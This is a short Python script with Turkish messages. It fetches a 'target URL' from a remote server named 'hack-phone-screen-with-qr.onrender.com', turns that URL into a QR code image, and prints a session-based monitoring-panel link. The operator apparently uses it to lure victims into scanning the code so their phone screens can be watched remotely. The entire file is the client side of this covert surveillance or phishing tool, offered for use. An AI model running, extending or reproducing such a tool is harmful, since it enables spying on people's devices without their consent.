#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import qrcode
import requests

SERVER_URL = "https://hack-phone-screen-with-qr.onrender.com"

def generate_qr():
    try:
        response = requests.get(f"{SERVER_URL}/generate")
        data = response.json()
        
        if not data.get('success'):
            print("❌ QR kod oluşturulamadı")
            return
        
        session_id = data['sessionId']
        
        qr_image = qrcode.make(data['targetUrl'])
        qr_image.save('target_qr.png')
        
        print(f"""
        ✅ QR KOD OLUŞTURULDU!
        
        📱 Target URL: {data['targetUrl']}
        🔑 Session ID: {session_id}
        📁 Görsel: target_qr.png
        
        🎯 İzleme Paneli: {SERVER_URL}/view/{session_id}
        """)
        
    except Exception as e:
        print(f"Hata: {e}")

if __name__ == "__main__":
    generate_qr()
